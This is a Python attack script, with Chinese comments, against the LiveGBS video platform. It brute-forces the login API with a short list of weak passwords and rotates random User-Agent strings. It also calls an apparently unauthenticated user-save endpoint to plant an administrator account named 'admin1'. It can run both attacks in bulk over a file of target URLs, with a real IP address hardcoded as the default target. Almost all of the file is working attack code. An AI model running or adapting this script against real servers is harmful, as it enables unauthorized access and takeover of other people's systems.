import argparse
import hashlib
import requests
import concurrent.futures
import sys
import random

def bao(url = 'http://119.3.237.170:10000'):
    url = url + '/api/v1/login'
    username = ['admin', 'admin1']
    password = ['12345678', '111111', 'password', 'admin']  # 对网站用户名和密码进行爆破！
    for i in username:
        for j in password:
            data ='username=' + i + '&password=' + hashlib.md5(j.encode('utf-8')).hexdigest()
            try:
                #读取 user-agents.txt 文件中的所有 user-agent 随机选择一个 user agent
                with open('user-agents.txt', 'r') as f:
                    useragents = f.readlines()
                random_useragent = random.choice(useragents).strip()
                headers = {'User-Agent': random_useragent,
                           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                r = requests.post(url, data=data, headers=headers, verify=False, allow_redirects=True, timeout=20)
                if r.status_code == 200:
                    print('\033[1;31m[+]%s Login Success！ username:%s & password:%s\033[0m' % (url, i, j))
                    with open('results.txt', 'a') as f:
                        f.write(url + ' username:%s & password:%s' % (i, j) + '\n')
                    # 登录成功退出
                    break
            except requests.exceptions.ConnectionError as e:
                print(f"连接失败")
                break
def add(url = 'http://119.3.237.170:10000'):
    urla = url + '/api/v1/user/save?ID=&Username=admin1&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
               'Connection': 'close'}
    r = requests.get(urla, headers=headers, verify=False, allow_redirects=True, timeout=10)
    if r.status_code == 200:
        print(url + 'Login Success！ username:admin1 & password:12345678')
        with open('results.txt', 'a') as f:
            f.write(url + ' username:admin1 & password:12345678' + '\n')
    else:
        print('添加失败！！或已存在该用户')

def pl(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        urls = [line.strip() for line in f.readlines()]
    return urls

def help():
    helpinfo = """  _      _            _____ ____   _____ 
 | |    (_)          / ____|  _ \ / ____|
 | |     ___   _____| |  __| |_) | (___  
 | |    | \ \ / / _ \ | |_ |  _ < \___ \ 
 | |____| |\ V /  __/ |__| | |_) |____) |
 |______|_| \_/ \___|\_____|____/|_____/ 
"""
    print(helpinfo)
    print("LiveGBS".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -fu --fileurl targetUrl.txt 即可对选中文档中的网址进行批量弱口令检测")
    print(f"[+]{sys.argv[0]} -fa --fileadd targetUrl.txt 即可对选中文档中的网址进行批量添加用户检测")
    print(f"[+]{sys.argv[0]} -a --add http://www.xxx.com 即可添加用户")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))

def main():
    parser = argparse.ArgumentParser(description='LiveGBS漏洞单批检测脚本@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-fu','--fileurl', type=str, help='批量弱口令检测文本')
    parser.add_argument('-fa', '--fileadd', type=str, help='批量添加用户检测文本')
    parser.add_argument('-a','--add', type=str, help='添加用户')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为5')
    args = parser.parse_args()
    thread = 5
    if args.thread:
        thread = args.thread
    if args.url:
        bao(args.url)
    elif args.add:
        add(args.add)
    elif args.fileurl:
        urls = pl(args.fileurl)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(bao, urls)
    elif args.fileadd:
        urls = pl(args.fileadd)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(add, urls)
    else:
        help()
if __name__ == '__main__':
    main()